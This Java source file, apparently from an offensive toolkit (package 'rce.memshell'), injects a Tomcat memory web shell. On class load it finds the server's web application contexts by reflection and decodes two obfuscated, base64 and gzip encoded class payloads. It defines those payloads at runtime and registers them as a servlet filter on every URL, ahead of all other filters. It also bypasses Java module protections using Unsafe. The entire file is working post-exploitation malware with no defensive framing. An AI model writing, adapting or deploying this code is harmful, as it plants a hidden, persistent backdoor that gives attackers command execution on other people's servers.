package rce.memshell;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;

public class TomcatFilter {
    static {
        new TomcatFilter();
    }

    public String getUrlPattern() {
        return "/*";
    }

    public String getClassName() {
        return "TomcatFilterShell";
    }

    public String getBase64String() {
        return new String("H4sIAAAAAAAAAKVWa3MTZRR+Nrd3s9lCm14gtKWgUtJrFLBqCggWELTQ2iDYFsVtsm22JLshu+lFVLzffoH9Bf3ijMOMhqKjg86IM3xkhvGj/g4/gM9uSklqwA9+2PNeznuec85zzr67t+/98DOAA/hKwW68KONIGLtwVOAlgZEIAjgm47iCE3hZgYqTMk654ysCr8oYlXFaxhkZYwrG8ZorJhSkcFbgdQUtOCfjvDu+4YpJV0zJmI4giAsK3sRbrrgo8HYEGmYE0gIZAV1CoKDZtoTo6Ly2oCVymjmXSDlFw5wblhA6aJiGc1iCP95zjkdHrAwtto4apn6mlJ/Ri2e1mRx35Ix1wsg5elHCdNwDWkrYenEhpzuJVGWc0C+XdNsZfpTWLlimrW9WV1BHspphDrsRNKQcLX3ptFbwHHtZzArMCWQrHJIpAUNgnqQwVwnK8aW0XnAMggtcEsgxCzcnCV2bA133ZZmzxpznTGQYcNFaJkrKKhXTOk8w2eaRfKZyNpXVc7lBF0XFHnSTpnQ+o+JJPCVhTy141nEKiZMUtXRI6P6vcxViVORhMiTLHjS1PDO3VBRgqrgMku5fNDi1QbzGzWWU4LOzFANpmjO+QX2JSfgSpK6kYgGLKpawLPCOiit4V0KTB1ByjFwildZMUy+6yb1HkwtHVbyPqyo+wIcqPnIdszs/xicCn6r4DJ+r+MJloflhCBvss0IqevClhC219NVEPDYzr6eZREu9ykjoeFxnSeh8bGtJiD2ytxjzdL3+r2RiWIlTZqHkcFvX8tW7Yxv5SdhZ13vVAXVOd8a1IqvnJdMd/7fHnnpBVFd02XZ0RhBxoYpWQS867M6IY41ai0xFc7NsiddFkdOW6TBVvurt1Z6ZfzHlMmim9eGeqQf193QTJdMx8sRU6G9j0VrjYH2bHgJsLPZYPF6HymoLBp7WbXu4xtX6JtuDrmrY3vbAXW0ZaL49XlfhvrpqydaP6Tkjb3hc730019WNTkyR1ewz+pLjXXlkI2B6izCjOl+sgFUHNE6odUV1u1RtSwguuhOXtzpBMNbgbK7kvqFH/t/N2XOOn5RdfCQ8wUdyryF+awKc8W6i3MtVH3ycAZHe65B6o77v4b/GJatGuQV+SoUmYcoId3vQSwMaSr/wO9JA7V99NxFIBvpvIpgMxgK938F/AyEfkqFY6Ba+DQyJqFiDnJRj8i00x+QywlGljMgKQv4h0SpWsCv0E9RJf7QhNRmIbklNEiXq8zBSq+hcV251lY01ymR4DU2xcBnRMpqTyo9omYwp19EabStjWzISi5SxfQXeGFtFMLojqcaCN9DO914to2N9XkbnKhqTYhWRgb7+G+jyYxUNydCDxTXmuxO/4jdKFXdwl6PPY2cKbZQNCJEnFU2IIUpdCwlvpb4NSWzDIe5ewQ5eg+34Gh34Bp1Y8/B2E7ELv3O8zcLcIad3WZY/WJg/yXIfkS9CuU+AsEC/wIDAoEBC4GmBZwT2SXyA3ZMC+++5mv0CBwSe5Z/Dvvv0J+oagVZDgb8h+GUcCuM5OgkxmefxAkubxHCltAwZnLHGDzsh5DVJv2fiNpBrcHCjiWLeuToGCcpDHtrhfwDY1iAi6ggAAA==");
    }
    //适配springboot3
    public String getBase64String2() throws IOException {
        return new String("H4sIAAAAAAAAAKVWWXMUVRT+bjKZO5npkGQCgRHIAkI2yLBGmIBKwqphkWExAcXOpJPpMOkJ3T1Z3HdxQ8WN4FLlU16ssqjSQLS0KKrEKh4tLat8kd/hA/h1z2SYMZPEKh+6+957zv3OOd855/a9def7nwBswZd+FKFYwqOgBF6BikF1RA0nVGMgfLh3UIvZAt4duqHbDwoUNzad8MHHQWyorxR+BCQUBWVYJLCoc6hvr56wNTMa1xIJAc+walkCwa57gFHb1I2BdokKgYZB9axq2mrY0syRhGaH47Y9HN7PVzS9cFQ7l9IsWyIo0LiwsjWcNCwtgHIsVrAE1QLKgGYfUU11SKNTAmsbZ3vSNHvJh2UCMmm1Gtzox31YLrFCwUoHMYeb6Lhla0MCAceImRzWTHvcj1rUSdQrWIXV+douNrXtZFdyVDM7VUsTWNxY0P4a8juqGw5ag4JGNAn4YknDVnWDfC7PDaMzrppRhycjprU39fjQIlBkxX1Yz+/6mA9hxsJctWpjmg8buRiO+bEZWyS2KmjDAwKV99COpgxbH6JjfgaVnSzJ8zKz3O6gbFcQQTszTfQYk9R4an6GyVNMsyzu3YkHJR5S8DB25XmQ0WA10YMDxnDKJoymkuelM17oyXCOgLXUOYOQsvVEOBpTDUMz/ejAHqei9wosayy40ynl/WTk9C5H+REFj6KLRZOytN1aQh/S3aJpmLtocs21OxCHFBzGERIeV61D2pjt9kuPIzmqIOpUhMfgsg/HBRBAJU4qeBzdAqUM9qSZNpgb5xGaywho4BROSzyh4EmcEagqoCNQMuoMnJQV8PqEA6Eq6HW6vKQ/kbLiEn0zUK7qnrGYNmzrSSOAfgxIxBXoGGTN/bv90o3O6tMNFmdfMj0X2O0YzlfN7+b2ueXpBqafEjw9qgubJIedyT6GWN6lG9qh1FCvZh5TexOac9AkY2rihGrqzjyz6LHjOsupoiv/dGLRqv/f1VkKObQwDlofUU22mOhJD7elP9vJeYFOYVIo3LiB6StYrxk5m7iqQAFmpJvSJtoy0y1ZsPz8tqfViFW3EAtpTeLWL8hHWnWzwMp5mUmr0bWmWWpz/AMyW7YKNP+HLVlvyqK2Gjt7UB12i0HiHYGa+aOVuCBQu0CcEqMSH+T0YN5B5c+SbEl8lKt1OCuR+ITMz2Emq8WyPajZ8WRf9ifGSvY4v2ImY3b1ZihOGv36gFt9NfOr8KDqY8hmcpxOR5MpM6ZRzp6pyu+VVicA1MO5Jwic5SOcPz4vDx6OeGfge4izna6cJ1vzVYjmoPwOpVc4LYLB9yIUOyJuca4NCpKcKWl1DOMcv4JHjUktQhUdJ2wZ1263XEd5xLPuOiojJSFP87conUZVESLekPcmvvG0yeDSawhFfCHfTVSFfFOoCd4/hbUT8Ba3ySVyAnXeH1HbXRxsjnZ7guui3UQJShcjOomVGWGrI9yQJ4yUXsOmUOkUtk1hR8T/Azq6Q/6r2B3cN4UDkUAoMIWDE3C/j02iJHgsooRKpkHWQ8oUejLjKTw1iYqInERgfcu6aWjFmERZxDszuUJ2anADPyNGNn7F7/wWu3z1oJrvcpJbQUkVQlhMzWqmYSlvBMv43w2R8BV4hheT85Rc4mXha9ThGjVuYDURV+EXfm9hDXGbiNyAP7jzL7S43F9gRurxFSzYkFy/jBRXfMTbhxGMMkvnaWMM48zWJTTjaUoCtFCNZ6mn0Po0nuPIS1QfnscLHDFfmVw6oxfxkpvf23gZrzBOZ/QqXmN8XvyJ1/EGa0HBb7TzJrP9FuVn4L/LoEol/BJvS7wr0S9RLlEpUSv4APXdEu/dQSvfEu9LdOzi8l1e0mTBTeCumOdvyA5+S3GRRrx05UN8jE85Liuml6B/oGdOBV7CRLoCsdWtXK7dK2GvG06rS191WpgNVxDoMt8XM12Rxi8RLr7AZ9kmaXHnBXA35rSEyLbE567WF/8ATUBjw60LAAA=");
    }

    public TomcatFilter() {
        try {
            List<Object> contexts;
            try {
                contexts = this.getContext();
            } catch (Exception e) {
                bypassModule(this.getClass());
                contexts = this.getContext();
            }
            Iterator var2 = contexts.iterator();
            while(var2.hasNext()) {
                Object context = var2.next();
                Object filter = this.getFilter(context);
                this.addFilter(context, filter);
            }
        } catch (Exception var5) {
            var5.printStackTrace();
        }

    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        Object context = null;

        try {
            Thread[] var4 = threads;
            int var5 = threads.length;

            for(int var6 = 0; var6 < var5; ++var6) {
                Thread thread = var4[var6];
                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                    HashMap childrenMap = (HashMap)getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    Iterator var9 = childrenMap.keySet().iterator();

                    while(var9.hasNext()) {
                        Object key = var9.next();
                        HashMap children = (HashMap)getFV(childrenMap.get(key), "children");
                        Iterator var12 = children.keySet().iterator();

                        while(var12.hasNext()) {
                            Object key1 = var12.next();
                            context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext")) {
                                contexts.add(context);
                            }

                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                                contexts.add(context);
                            }
                        }
                    }
                } else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
                    if (context != null && context.getClass().getName().contains("StandardContext")) {
                        contexts.add(context);
                    }

                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                        contexts.add(context);
                    }
                }
            }

            return contexts;
        } catch (Exception var14) {
            throw new RuntimeException(var14);
        }
    }

    private Object getFilter(Object context) throws IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException, InstantiationException {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }

        try {
            filter = classLoader.loadClass(this.getClassName());
        } catch (Exception var9) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            } catch (Throwable var8) {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String2()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            }
        }

        return filter;
    }

    public String getFilterName(String className) {
        if (className.contains(".")) {
            int lastDotIndex = className.lastIndexOf(".");
            return className.substring(lastDotIndex + 1);
        } else {
            return className;
        }
    }

    public void addFilter(Object context, Object filter) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        ClassLoader catalinaLoader = this.getCatalinaLoader();
        String filterClassName = this.getClassName();
        String filterName = this.getFilterName(filterClassName);

        try {
            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterName}) != null) {
                return;
            }
        } catch (Exception var16) {
        }

        Object filterDef;
        Object filterMap;
        try {
            filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
        } catch (Exception var15) {
            try {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
            } catch (Exception var14) {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef", true, catalinaLoader).newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap", true, catalinaLoader).newInstance();
            }
        }

        try {
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});

            Constructor[] constructors;
            try {
                invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
            } catch (Exception var12) {
                invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", true, catalinaLoader).getDeclaredConstructors();
            }

            try {
                invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            } catch (Exception var11) {
                invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            }

            constructors[0].setAccessible(true);
            Object filterConfig = constructors[0].newInstance(context, filterDef);
            Map filterConfigs = (Map)getFV(context, "filterConfigs");
            filterConfigs.put(filterName, filterConfig);
        } catch (Exception var13) {
            var13.printStackTrace();
        }

    }

    public ClassLoader getCatalinaLoader() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        ClassLoader catalinaLoader = null;

        for(int i = 0; i < threads.length; ++i) {
            if (threads[i].getName().contains("ContainerBackgroundProcessor")) {
                catalinaLoader = threads[i].getContextClassLoader();
                break;
            }
        }

        return catalinaLoader;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str));
        } catch (Exception var4) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str));
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];

        int n;
        while((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();

        while(clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException var4) {
                clazz = clazz.getSuperclass();
            }
        }

        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(Object obj, String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = obj instanceof Class ? (Class)obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;

        while(method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    Method[] methods = tempClass.getDeclaredMethods();

                    for(int i = 0; i < methods.length; ++i) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException var11) {
                tempClass = tempClass.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            if (obj instanceof Class) {
                try {
                    return method.invoke((Object)null, param);
                } catch (IllegalAccessException var9) {
                    throw new RuntimeException(var9.getMessage());
                }
            } else {
                try {
                    return method.invoke(obj, param);
                } catch (IllegalAccessException var10) {
                    throw new RuntimeException(var10.getMessage());
                }
            }
        }
    }

    public static void bypassModule(Class currentClass) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        Class unsafeClass = Class.forName("sun.misc.Unsafe");
        Field field = unsafeClass.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Object unsafe = field.get(null);
        Object baseModule = Class.class.getMethod("getModule").invoke(Object.class);
        long offset = (long) invokeMethod(unsafe, "objectFieldOffset", new Class[]{Field.class}, new Object[]{Class.class.getDeclaredField("module")});
        invokeMethod(unsafe, "putObject", new Class[]{Object.class, long.class, Object.class}, new Object[]{currentClass, offset, baseModule});
    }
}